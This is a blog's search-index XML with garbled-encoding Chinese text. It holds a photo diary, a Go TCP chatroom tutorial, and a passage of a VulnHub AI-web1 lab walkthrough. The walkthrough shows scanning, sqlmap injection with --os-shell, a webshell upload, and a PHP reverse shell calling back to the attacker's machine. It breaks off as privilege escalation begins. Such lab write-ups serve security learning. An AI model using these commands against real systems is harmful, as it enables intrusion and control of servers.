<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>åŠå¹´æ­å·ä½“éªŒå¡å³å°†åˆ°æœŸ</title>
    <link href="/2022/12/07/vblog1/"/>
    <url>/2022/12/07/vblog1/</url>
    
    <content type="html"><![CDATA[<h1 id="æ­å·åŠå¹´ä½“éªŒå¡"><a href="#æ­å·åŠå¹´ä½“éªŒå¡" class="headerlink" title="æ­å·åŠå¹´ä½“éªŒå¡"></a>æ­å·åŠå¹´ä½“éªŒå¡</h1><p>æœ¬æ¥ä»¥ä¸ºä¸€ä¸ªå­¦æœŸä¼šå¾ˆæ…¢ï¼Œä½†æ˜¯ç°åœ¨å‘ç°æ—¶é—´è¿‡å¾—å¥½å¿«ã€‚</p><p>å››ä¸ªæœˆæ¥æ‹äº†å¾ˆå¤šç…§ç‰‡ï¼Œä½†æ˜¯éƒ½æ²¡å‘æœ‹å‹åœˆã€‚</p><h2 id="å…³äºæ­ç ”"><a href="#å…³äºæ­ç ”" class="headerlink" title="å…³äºæ­ç ”"></a>å…³äºæ­ç ”</h2><table><thead><tr><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909_125413767_iOS.jpg" alt="20220909_125413767_iOS"></th><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_142137039_iOS.jpg" alt="20220910_142137039_iOS"></th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111228259.png" alt="image-20221207111228259"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111355531.png" alt="image-20221207111355531"></td></tr><tr><td><img src="/2022/12/07/vblog1/OneDrive%20-%20cumt.edu.cn/%E5%9B%BE%E7%89%87/%E6%9C%AC%E6%9C%BA%E7%85%A7%E7%89%87/2022/11/20221130_094731139_iOS.jpg" alt="20221130_094731139_iOS"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092918159_iOS.jpg" alt="20221112_092918159_iOS"></td></tr></tbody></table><h2 id="å…³äºè¥¿æ¹–"><a href="#å…³äºè¥¿æ¹–" class="headerlink" title="å…³äºè¥¿æ¹–"></a>å…³äºè¥¿æ¹–</h2><table><thead><tr><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_090838376_iOS.jpg" alt="20220910_090838376_iOS"></th><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091601507_iOS.jpg" alt="20220910_091601507_iOS"></th><th><img src="/2022/12/07/vblog1/OneDrive%20-%20cumt.edu.cn/%E5%9B%BE%E7%89%87/%E6%9C%AC%E6%9C%BA%E7%85%A7%E7%89%87/2022/09/20220910_092605365_iOS.jpg" alt="20220910_092605365_iOS"></th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_093711007_iOS.jpg" alt="20220910_093711007_iOS"></td><td><img src="/2022/12/07/vblog1/OneDrive%20-%20cumt.edu.cn/%E5%9B%BE%E7%89%87/%E6%9C%AC%E6%9C%BA%E7%85%A7%E7%89%87/2022/09/20220910_095123680_iOS.jpg" alt="20220910_095123680_iOS"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095545635_iOS.jpg" alt="20220910_095545635_iOS"></td></tr><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091850580_iOS.jpg" alt="20220910_091850580_iOS"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095521961_iOS.jpg" alt="20220910_095521961_iOS"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_101905976_iOS.jpg" alt="20220910_101905976_iOS"></td></tr><tr><td><img src="/2022/12/07/vblog1/OneDrive%20-%20cumt.edu.cn/%E5%9B%BE%E7%89%87/%E6%9C%AC%E6%9C%BA%E7%85%A7%E7%89%87/2022/11/20221127_092047692_iOS.jpg" alt="20221127_092047692_iOS"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092218929_iOS.jpg" alt="20221127_092218929_iOS"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092607734_iOS.jpg" alt="20221127_092607734_iOS"></td></tr></tbody></table><h2 id="å…³äºç»å…´"><a href="#å…³äºç»å…´" class="headerlink" title="å…³äºç»å…´"></a>å…³äºç»å…´</h2><table><thead><tr><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111836034.png" alt="image-20221207111836034"></th><th><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20221207111857720.png" alt="image-20221207111857720"></th><th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111920504.png" alt></th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111905422.png" alt="image-20221207111905422"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112733073.png" alt="image-20221207112733073"></td><td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112652542.png" alt="image-20221207112652542"></td></tr><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112051468.png" alt="image-20221207112051468"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221004_033920832_iOS.jpg" alt></td><td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111929931.png" alt></td></tr></tbody></table><h2 id="å…³äºæ­å·"><a href="#å…³äºæ­å·" class="headerlink" title="å…³äºæ­å·"></a>å…³äºæ­å·</h2><p>â€¦.</p><table><thead><tr><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114150650.png" alt="image-20221207114150650"></th><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113619574.png" alt="image-20221207113619574"></th><th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221003_042522512_iOS.jpg" alt></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113814788.png" alt="image-20221207113814788"></td><td><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20221207113919110.png" alt="image-20221207113919110"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114011453.png" alt="image-20221207114011453"></td></tr><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114342399.png" alt="image-20221207114304031"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114240111.png" alt="image-20221207114240111"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114408016.png" alt="image-20221207114408016"></td></tr></tbody></table><p>å…³äºğŸŒ‡</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç…§ç‰‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>chatroom</title>
    <link href="/2022/12/07/chatroom/"/>
    <url>/2022/12/07/chatroom/</url>
    
    <content type="html"><![CDATA[<h1 id="GOè¯­è¨€å®ç°çš„èŠå¤©å®¤"><a href="#GOè¯­è¨€å®ç°çš„èŠå¤©å®¤" class="headerlink" title="GOè¯­è¨€å®ç°çš„èŠå¤©å®¤"></a>GOè¯­è¨€å®ç°çš„èŠå¤©å®¤</h1><p>å®ç°å¾ˆç®€å•ï¼ŒåŸºäºtcp socket,åšè¿™ä¸ªå°é¡¹ç›®çš„ç›®çš„æ˜¯æ£€æµ‹å¯¹channelçš„ç†è§£ï¼Œchannelåœ¨å¹¶å‘åœºæ™¯ä¸­çœŸçš„å¥½ç”¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¹Ÿæ˜¯çœŸæŒºéš¾ç†è§£çš„</p><h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>æ¯ä¸ªè¿æ¥çš„ç”¨æˆ·éœ€è¦å¯¹åº”ä¸€ä¸ªè´¦å·ï¼Œå› æ­¤éœ€è¦åˆ›å»ºä¸€ä¸ªå…¨å±€çš„structï¼Œç”¨æˆ·æœ‰åå­—ï¼Œidï¼Œä»¥åŠæ¥å—æ¶ˆæ¯çš„ç®¡é“</p><pre><code class="hljs go"><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<span class="hljs-comment">// åå­—</span>name <span class="hljs-keyword">string</span><span class="hljs-comment">// id</span>id <span class="hljs-keyword">string</span><span class="hljs-comment">// msgç®¡é“</span>msg <span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>&#125;</code></pre><h3 id="map-amp-message"><a href="#map-amp-message" class="headerlink" title="map&amp;message"></a>map&amp;message</h3><p>è¿˜éœ€è¦ä¸€ä¸ªå…¨å±€çš„mapä¿å­˜æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä»¥ä¾¿æœåŠ¡å™¨ç«¯å‘æ‰€æœ‰çš„ç”¨æˆ·è½¬å‘æ¶ˆæ¯</p><pre><code class="hljs go"><span class="hljs-comment">// éœ€è¦ä¸€ä¸ªå…¨å±€çš„mapå­˜å‚¨æ‰€æœ‰userä¿¡æ¯</span><span class="hljs-keyword">var</span> allUsers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>] User)</code></pre><p>è½¬å‘æ¶ˆæ¯æ—¶åˆéœ€è¦ä¸€ä¸ªç®¡é“æ¥æ”¶ç”¨æˆ·å‘é€çš„æ¶ˆæ¯åè½¬å‘ç»™æ‰€æœ‰ç”¨æˆ·</p><pre><code class="hljs go"><span class="hljs-comment">// éœ€è¦ä¸€ä¸ªå…¨å±€çš„ç®¡é“message å‘æ‰€æœ‰ç”¨æˆ·å‘é€æ¶ˆæ¯</span><span class="hljs-keyword">var</span> message = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>, <span class="hljs-number">10</span>)</code></pre><h2 id="åŠŸèƒ½å®ç°"><a href="#åŠŸèƒ½å®ç°" class="headerlink" title="åŠŸèƒ½å®ç°"></a>åŠŸèƒ½å®ç°</h2><p>éœ€è¦ä¸€ä¸ªå¹¿æ’­å‡½æ•°ï¼Œå¼€å¯è¯¥goroutineåå¯ä»¥ä¸€ç›´ç›‘å¬messageç®¡é“ä¸­çš„æ¶ˆæ¯ï¼Œç„¶åå‘ç”¨æˆ·è½¬å‘æ¶ˆæ¯</p><p>éœ€è¦ä¸€ä¸ªä¸šåŠ¡å¤„ç†å‡½æ•°ï¼Œå½“ç”¨æˆ·å‘é€æ¶ˆæ¯åï¼Œé€šè¿‡è¯¥å‡½æ•°å¤„ç†</p><p>éœ€è¦ä¸€ä¸ªæ¶ˆæ¯åé¦ˆå‡½æ•°ï¼Œå°†User.msgä¸­çš„æ¶ˆæ¯è¿”å›åˆ°å®¢æˆ·ç«¯</p><h3 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">broadcast</span><span class="hljs-params">()</span></span>&#123;fmt.Println(<span class="hljs-string">&quot;[+]:å¹¿æ’­goåç¨‹å¯åŠ¨æˆåŠŸ...&quot;</span>)<span class="hljs-keyword">for</span>&#123;<span class="hljs-comment">// ä»messageä¸­è¯»å–æ•°æ®</span>info := &lt;- message<span class="hljs-comment">// å°†æ¶ˆæ¯å‘é€ç»™æ‰€æœ‰ç”¨æˆ·</span><span class="hljs-keyword">if</span> info != <span class="hljs-string">&quot;&quot;</span>&#123;<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> allUsers&#123;user.msg &lt;- info&#125;&#125;&#125;&#125;</code></pre><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;<span class="hljs-keyword">for</span> <span class="hljs-literal">true</span> &#123;fmt.Println(<span class="hljs-string">&quot;[+]:å¯åŠ¨ä¸šåŠ¡...&quot;</span>)<span class="hljs-comment">// æ¯æ¬¡å»ºç«‹æ–°è¿æ¥éœ€è¦åˆ›å»ºä¸€ä¸ªuser</span>clientAddr := conn.RemoteAddr().String()newUser := User&#123;name : clientAddr,id : clientAddr,msg: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>),  <span class="hljs-comment">// ä¸€å®šè¦ä½¿ç”¨makeï¼Œå¦åˆ™æ²¡æœ‰ç©ºé—´å†™äºº</span>&#125;fmt.Println(clientAddr)_, ok := allUsers[clientAddr]<span class="hljs-keyword">if</span> !ok&#123;<span class="hljs-comment">//å°†æ–°åˆ›å»ºçš„ç”¨æˆ·æ·»åŠ åˆ°mapä¸­</span>allUsers[newUser.id] = newUser<span class="hljs-comment">// å‘å¹¿æ’­ä¸­å†™å…¥æ¶ˆæ¯ é€šçŸ¥å…¶ä»–äººä½ å·²ç»ä¸Šçº¿</span>loginInfo := fmt.Sprintf(<span class="hljs-string">&quot;[%s]:[%s] ====&gt; online now!&quot;</span>, newUser.name, newUser.id)message &lt;- loginInfotime.Sleep(time.Second)<span class="hljs-keyword">go</span> writeToClient(newUser, conn)&#125;buf:= <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">1024</span>)cnt, err := conn.Read(buf)<span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;fmt.Println(<span class="hljs-string">&quot;conn.Read error: &quot;</span> , err)&#125;<span class="hljs-comment">//fmt.Println(&quot;æœåŠ¡å™¨ç«¯æ¥å—çš„æ•°æ®ä¸ºï¼š&quot;,  string(buf[:cnt]), &quot;, cnt:&quot;, cnt)</span>userInfo:= fmt.Sprintf(<span class="hljs-string">&quot;[%s] say:&quot;</span>, clientAddr)message &lt;- userInfo + <span class="hljs-keyword">string</span>(buf[:cnt])&#125;&#125;</code></pre><h3 id="writeToClient"><a href="#writeToClient" class="headerlink" title="writeToClient"></a>writeToClient</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeToClient</span><span class="hljs-params">(user User, conn net.Conn)</span></span>&#123;<span class="hljs-keyword">for</span> msg := <span class="hljs-keyword">range</span> user.msg&#123;conn.Write([]<span class="hljs-keyword">byte</span>(msg + <span class="hljs-string">&quot;\n&quot;</span>))&#125;&#125;</code></pre><p>å®Œæ•´ç¨‹åº</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-string">&quot;net&quot;</span><span class="hljs-string">&quot;time&quot;</span>)<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<span class="hljs-comment">// åå­—</span>name <span class="hljs-keyword">string</span><span class="hljs-comment">// id</span>id <span class="hljs-keyword">string</span><span class="hljs-comment">// msgç®¡é“</span>msg <span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>&#125;<span class="hljs-comment">// éœ€è¦ä¸€ä¸ªå…¨å±€çš„mapå­˜å‚¨æ‰€æœ‰userä¿¡æ¯</span><span class="hljs-keyword">var</span> allUsers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>] User)<span class="hljs-comment">// éœ€è¦ä¸€ä¸ªå…¨å±€çš„ç®¡é“message å‘æ‰€æœ‰ç”¨æˆ·å‘é€æ¶ˆæ¯</span><span class="hljs-keyword">var</span> message = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>, <span class="hljs-number">10</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;listen, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:8080&quot;</span>)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(<span class="hljs-string">&quot;net.listen err: &quot;</span>, err)&#125;fmt.Println(<span class="hljs-string">&quot;[+]:æœåŠ¡å™¨ç›‘å¬æˆåŠŸ&quot;</span>)<span class="hljs-comment">// å¯åŠ¨å…¨å±€å”¯ä¸€çš„ å¹¿æ’­åç¨‹</span><span class="hljs-keyword">go</span> broadcast()<span class="hljs-keyword">for</span>&#123;accept, err := listen.Accept()<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(<span class="hljs-string">&quot;[+]:listen.accept err: &quot;</span>, err)&#125;fmt.Println(<span class="hljs-string">&quot;[+]:å»ºç«‹è¿æ¥æˆåŠŸ...&quot;</span>)<span class="hljs-keyword">go</span> handler(accept)&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;<span class="hljs-keyword">for</span> <span class="hljs-literal">true</span> &#123;fmt.Println(<span class="hljs-string">&quot;[+]:å¯åŠ¨ä¸šåŠ¡...&quot;</span>)<span class="hljs-comment">// æ¯æ¬¡å»ºç«‹æ–°è¿æ¥éœ€è¦åˆ›å»ºä¸€ä¸ªuser</span>clientAddr := conn.RemoteAddr().String()newUser := User&#123;name : clientAddr,id : clientAddr,msg: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>),  <span class="hljs-comment">// ä¸€å®šè¦ä½¿ç”¨makeï¼Œå¦åˆ™æ²¡æœ‰ç©ºé—´å†™äºº</span>&#125;fmt.Println(clientAddr)_, ok := allUsers[clientAddr]<span class="hljs-keyword">if</span> !ok&#123;<span class="hljs-comment">//å°†æ–°åˆ›å»ºçš„ç”¨æˆ·æ·»åŠ åˆ°mapä¸­</span>allUsers[newUser.id] = newUser<span class="hljs-comment">// å‘å¹¿æ’­ä¸­å†™å…¥æ¶ˆæ¯ é€šçŸ¥å…¶ä»–äººä½ å·²ç»ä¸Šçº¿</span>loginInfo := fmt.Sprintf(<span class="hljs-string">&quot;[%s]:[%s] ====&gt; online now!&quot;</span>, newUser.name, newUser.id)message &lt;- loginInfotime.Sleep(time.Second)<span class="hljs-keyword">go</span> writeToClient(newUser, conn)&#125;buf:= <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">1024</span>)cnt, err := conn.Read(buf)<span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;fmt.Println(<span class="hljs-string">&quot;conn.Read error: &quot;</span> , err)&#125;<span class="hljs-comment">//fmt.Println(&quot;æœåŠ¡å™¨ç«¯æ¥å—çš„æ•°æ®ä¸ºï¼š&quot;,  string(buf[:cnt]), &quot;, cnt:&quot;, cnt)</span>userInfo:= fmt.Sprintf(<span class="hljs-string">&quot;[%s] say:&quot;</span>, clientAddr)message &lt;- userInfo + <span class="hljs-keyword">string</span>(buf[:cnt])&#125;&#125;<span class="hljs-comment">// å‘æ‰€æœ‰ç”¨æˆ·å¹¿æ’­æ¶ˆæ¯ï¼Œ å…¨å±€å”¯ä¸€</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">broadcast</span><span class="hljs-params">()</span></span>&#123;fmt.Println(<span class="hljs-string">&quot;[+]:å¹¿æ’­goåç¨‹å¯åŠ¨æˆåŠŸ...&quot;</span>)<span class="hljs-keyword">for</span>&#123;<span class="hljs-comment">// ä»messageä¸­è¯»å–æ•°æ®</span>info := &lt;- message<span class="hljs-comment">// å°†æ¶ˆæ¯å‘é€ç»™æ‰€æœ‰ç”¨æˆ·</span><span class="hljs-keyword">if</span> info != <span class="hljs-string">&quot;&quot;</span>&#123;<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> allUsers&#123;user.msg &lt;- info&#125;&#125;&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeToClient</span><span class="hljs-params">(user User, conn net.Conn)</span></span>&#123;<span class="hljs-keyword">for</span> msg := <span class="hljs-keyword">range</span> user.msg&#123;conn.Write([]<span class="hljs-keyword">byte</span>(msg + <span class="hljs-string">&quot;\n&quot;</span>))&#125;&#125;</code></pre><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ç”¨æˆ·ä¸€</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103317397.png" alt="image-20221207103317397"></p><p>ç”¨æˆ·äºŒ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103251004.png" alt="image-20221207103251004"></p><p>ç”¨æˆ·ä¸‰</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103427557.png" alt="image-20221207103427557"></p><p>æ§åˆ¶å°æ¶ˆæ¯</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103500122.png" alt></p><p>åç»­å†å¯¹èŠå¤©å®¤è¿›ä¸€æ­¥ä¼˜åŒ–</p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
      <tag>tcp</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub</title>
    <link href="/2022/09/30/vulnhub/"/>
    <url>/2022/09/30/vulnhub/</url>
    
    <content type="html"><![CDATA[<h1 id="AI-web1"><a href="#AI-web1" class="headerlink" title="AI-web1"></a>AI-web1</h1><h2 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h2><p>åªè¦ä½¿é¶æœºä¸kaliå¤„äºåŒä¸€ç½‘æ®µå³å¯</p><h2 id="ç½‘ç»œå—…æ¢"><a href="#ç½‘ç»œå—…æ¢" class="headerlink" title="ç½‘ç»œå—…æ¢"></a>ç½‘ç»œå—…æ¢</h2><p>åœ¨kaliä¸­ä½¿ç”¨</p><pre><code class="hljs sh">netdiscover  <span class="hljs-comment"># å¯ä»¥æ¢æµ‹å‡ºä¸kaliå¤„äºåŒä¸€ç½‘æ®µä¸­å­˜æ´»çš„ä¸»æœº</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233618239.png" alt="image-20220929233618239"></p><p>ç”±å›¾ä¸­çš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°é¶æœºçš„ipåœ°å€ä¸º<code>192.168.152.133</code></p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>ä½¿ç”¨nmapæ‰«ææŒ‡å®šçš„ip</p><pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.152.133</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233830903.png" alt="image-20220929233830903"></p><p>æ‰«æç»“æœæ˜¾ç¤ºé¶æœºçš„80ç«¯å£å¼€æ”¾ï¼Œå¹¶ä¸”æ¢æµ‹åˆ°urlï¼Œä½¿ç”¨çš„ä¸­é—´ä»¶ä¸ºapache</p><p>è®¿é—®  <code>m3diNf0/</code>å’Œ<code>/se3reTdir777/uploads/</code>ï¼Œæ²¡æœ‰æœ‰ç”¨ä¿¡æ¯ï¼Œç»§ç»­æ‰«æè·¯å¾„</p><pre><code class="hljs sh">dirb http://192.168.152.133/m3diNf0/dirb http://192.168.152.133/se3reTdir777/uploads/dirb http://192.168.152.133/se3reTdir777/</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234638450.png" alt="image-20220929234638450"></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234645788.png" alt="image-20220929234645788"></p><p>æ‰«æä¸¤ä¸ªå¯è®¿é—®çš„çš„urlï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œinfo.phpä¸­æ˜¯phpinfoçš„ä¿¡æ¯ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªä¿¡æ¯å¾ˆæœ‰ç”¨å°±æ˜¯ï¼Œç½‘ç«™çš„æ ¹ç›®å½•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234927206.png" alt="image-20220929234927206"></p><p>è€Œ<code>http://192.168.152.133/se3reTdir777/index.php</code>ï¼Œæ˜¯ä¸€ä¸ªç”¨æˆ·æŸ¥è¯¢çš„æ¥å£ï¼Œå¾ˆæ˜æ˜¾åƒæ˜¯sqlæ³¨å…¥ï¼Œç›´æ¥ç”¨sqlmapæ‰«</p><pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --dbssqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tablessqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user -columns</code></pre><p>æœ€åè·å¾—ç»“æœå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¯ä»¥å°è¯•ä½¿ç”¨sqlmapè·å–shellæƒé™</p><pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --level=3 --os-shell</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929235903463.png" alt="image-20220929235903463"></p><p>èƒ½å¤Ÿè·å–shellæƒé™ï¼Œä½†æ˜¯æƒé™å¾ˆä½ï¼Œåªæ˜¯www-data</p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>å‰æ–‡æˆ‘ä»¬å·²ç»çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ï¼Œå…¶å®å°±å°±æ˜¯å¯ä»¥å°è¯•sqlmapçš„æ–‡ä»¶ä¸Šä¼ </p><p>å°†ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸­</p><pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</code></pre><p>ä¸Šä¼ æˆåŠŸåä½¿ç”¨å·¥å…·è¿æ¥å³å¯</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930000537720.png" alt="image-20220930000537720"></p><p>æ­¤æ—¶å·²ç»è·å–åˆ°äº†ç½‘ç«™çš„æ§åˆ¶æƒï¼Œä½†æ˜¯æƒé™ä¾ç„¶å¾ˆä½ï¼Œå› æ­¤éœ€è¦è¿›è¡Œææƒ</p><p>ä¸ºäº†æ“ä½œæ–¹ä¾¿ï¼Œéœ€è¦å…ˆåå¼¹shell</p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>é¦–å…ˆåœ¨kaliä¸­ç›‘å¬4444ç«¯å£</p><pre><code class="hljs sh">nv -lvvp 4444</code></pre><p>ç„¶ååœ¨ç½‘ç«™ä¸­ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;192.168.152.130&quot;</span>,<span class="hljs-number">4444</span>);exec(<span class="hljs-string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>ä¸Šä¼ æˆåŠŸåï¼Œæ‰§è¡Œè¯¥æ–‡ä»¶</p><pre><code class="hljs sh">php web.php</code></pre><p>å³å¯è·å–shell</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>é¦–å…ˆåœ¨kaliä¸­ä½¿ç”¨opensslåˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><pre><code class="hljs sh">openssl passwd -1 -salt hacker 123456</code></pre><p>å°†è¯¥ç”¨æˆ·åŠ 